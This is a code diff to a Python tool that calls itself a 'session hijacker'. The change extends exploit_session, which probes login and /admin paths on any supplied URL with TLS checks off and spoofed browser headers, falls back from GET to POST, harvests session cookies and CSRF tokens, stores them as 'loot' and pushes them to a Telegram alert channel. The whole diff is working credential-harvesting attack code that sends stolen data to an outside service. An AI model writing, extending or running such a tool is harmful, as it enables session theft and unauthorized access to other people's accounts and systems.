@@ -34,7 +34,7 @@ def broadcast_tg_alert_sync(loot_type, details):
 def exploit_session(target_url):
     """
     Harvests active session cookies, CSRF tokens, and transport state 
-    dynamically for any provided pre-production target URL.
+    dynamically for any provided pre-production target URL with multi-vector verification.
     """
     if not target_url:
         print("[-] Error: No target URL supplied to session hijacker.")
@@ -46,29 +46,49 @@ def exploit_session(target_url):
     base_url = f"{parsed.scheme}://{parsed.netloc}"
     
     # Check both standard login and auth entry points across frameworks
-    target_entry_paths = ["/user/login", "/login", "/auth/login", "/api/auth/login"]
+    target_entry_paths = ["/user/login", "/login", "/auth/login", "/api/auth/login", "/admin"]
     
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "X-Requested-With": "XMLHttpRequest"
-    }
+    base_headers = [
+        {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "X-Requested-With": "XMLHttpRequest"
+        },
+        {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+            "Accept": "application/json, text/plain, */*"
+        }
+    ]
 
     with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
         resp = None
         used_url = ""
+        active_headers = base_headers[0]
         
-        # Probe potential login/auth gateways dynamically
+        # Probe potential login/auth gateways dynamically with header/method variations
         for path in target_entry_paths:
             test_url = f"{base_url}{path}"
-            try:
-                resp = client.get(test_url, headers=headers)
-                if resp.status_code < 400:
-                    used_url = test_url
-                    print(f"[+] Successfully established transport gate at: {used_url}")
-                    break
-            except Exception as e:
-                continue
+            for headers in base_headers:
+                try:
+                    # Test GET first
+                    resp = client.get(test_url, headers=headers)
+                    if resp.status_code < 400:
+                        used_url = test_url
+                        active_headers = headers
+                        print(f"[+] Successfully established transport gate at: {used_url} (Status: {resp.status_code})")
+                        break
+                    
+                    # Fallback method mutation (POST/OPTIONS check if GET is locked)
+                    resp = client.post(test_url, headers=headers, json={})
+                    if resp.status_code < 400:
+                        used_url = test_url
+                        active_headers = headers
+                        print(f"[+] Successfully established POST transport gate at: {used_url}")
+                        break
+                except Exception as e:
+                    continue
+            if resp and resp.status_code < 400:
+                break
 
         if not resp or resp.status_code >= 400:
             print(f"[-] Failed to establish session handshake with {base_url}. Check target availability.")
@@ -106,7 +126,7 @@ def exploit_session(target_url):
 
             # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
             broadcast_tg_alert_sync("Session Seed Harvested", harvest_data)
-            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": headers}, resp.text[:300], harvest_data)
+            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": active_headers}, resp.text[:300], harvest_data)
             save_session_loot(
                 target=base_url,
                 endpoint=used_url,
@@ -121,7 +141,7 @@ def exploit_session(target_url):
                 "base_url": base_url,
                 "cookies": captured_cookies,
                 "csrf_token": csrf_val,
-                "headers": headers
+                "headers": active_headers
             }, csrf_val
         else:
             print("[-] Warning: Handshake completed but no session cookies or tokens were issued.")
